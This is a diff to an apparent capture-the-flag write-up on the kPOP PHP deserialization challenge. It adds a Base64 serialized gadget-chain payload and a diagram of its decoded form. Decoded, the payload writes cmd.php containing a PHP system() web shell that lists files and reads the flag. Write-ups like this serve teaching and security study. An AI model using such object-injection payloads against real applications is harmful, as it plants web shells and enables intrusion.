@@ -37,6 +37,20 @@ To better understand the relationships between kPOP classes in a more visual way
 </p>
 <p align="center">kPOP UML Diagram</p>
 
+The final serialized payload will be as follows, in Base64 format:
+
+`Tzo2OiJMeXJpY3MiOjI6e3M6OToiACoAbHlyaWNzIjtzOjEyOiJzaGVsbF9seXJpY3MiO3M6NzoiACoAc29uZyI7Tzo0OiJTb25nIjo0OntzOjk6IgAqAGxvZ2dlciI7Tzo2OiJMb2dnZXIiOjE6e3M6MTI6IgAqAGxvZ3dyaXRlciI7TzoxNDoiTG9nV3JpdGVyX0ZpbGUiOjI6e3M6MTE6IgAqAGZpbGVuYW1lIjtzOjc6ImNtZC5waHAiO3M6OToiACoAZm9ybWF0IjtPOjEzOiJMb2dGaWxlRm9ybWF0IjoyOntzOjEwOiIAKgBmaWx0ZXJzIjthOjE6e2k6MDtPOjEyOiJPdXRwdXRGaWx0ZXIiOjI6e3M6MTU6IgAqAG1hdGNoUGF0dGVybiI7czoxOToiL1xbaVxdKC4qKVxbXC9pXF0vaSI7czoxNDoiACoAcmVwbGFjZW1lbnQiO3M6OToiPGk+XDE8L2k+Ijt9fXM6NzoiACoAZW5kbCI7czoxOiIKIjt9fX1zOjc6IgAqAG5hbWUiO3M6MzU6Ijw/cGhwIHN5c3RlbSgnbHMgLWw7IGNhdCBmbGFnJyk7ID8+IjtzOjg6IgAqAGdyb3VwIjtzOjExOiJzaGVsbF9ncm91cCI7czo2OiIAKgB1cmwiO3M6MTk6Imh0dHBzOlwvXC9zaGVsbC5jb20iO319`
+
+<br />
+
+We can use the PlantUML Editor[^1] to visualize the decoded payload in a Class Object format:
+<br />
+
+<p align="center">
+  <img src="{{ site.url }}/images/unserialize_poc.png" alt="unserialize_poc" />
+</p>
+<p align="center">unserialize.com</p>
+
 ### Conclusion
 
 PlantUML Editor[^1]
